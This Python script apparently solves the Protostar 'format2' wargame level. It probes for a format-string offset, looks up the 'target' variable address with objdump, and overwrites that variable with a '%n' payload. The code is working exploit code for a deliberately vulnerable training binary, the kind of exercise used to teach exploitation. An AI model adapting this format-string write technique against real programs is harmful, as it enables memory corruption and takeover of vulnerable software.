#!/usr/bin/env python
#-*- coding: utf-8 -*-

import sys
import struct
import subprocess


def find_var_addr(binary, var_name):
    addr = 0
    p1 = subprocess.Popen(["objdump", "-D", binary], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["grep", var_name], stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.Popen(["awk", "{FS = \" \"; print $1}" ], stdin=p2.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    p2.stdout.close()
    res = p3.communicate()[0]
    addr = int(res.strip(), base=16)
    return addr

found = False
for i in range(1, 800):
    payload = struct.pack('<L', 0x41414141)
    payload += '.%' + str(i) + '$x'
    p1 = subprocess.Popen(["echo", "-e", payload], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["/opt/protostar/bin/format2"], stdin=p1.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    res = p2.communicate()[0]
    if res.strip() == 'AAAA.41414141\ntarget is 0 :(':
        found = True
        break

if found:
    print('[+] Offset = {0}'.format(i))
    
    binary = '/opt/protostar/bin/format2'
    var_name = 'target'
    addr = find_var_addr(binary, var_name)

    payload = struct.pack('<L', addr) # var target address. objdump -D bin | grep target
    payload += '%.60d%' + str(i) + '$n'
    
    p1 = subprocess.Popen(["echo", "-e", payload], stdout=subprocess.PIPE)
    p2 = subprocess.Popen([binary], stdin=p1.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    res = p2.communicate()[0]
    print(res)
    '''
    process = subprocess.Popen(['/opt/protostar/bin/format2'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    process.stdin.write(payload)
    print process.stdout.read()
    '''
else:
    print('[-] Not found')
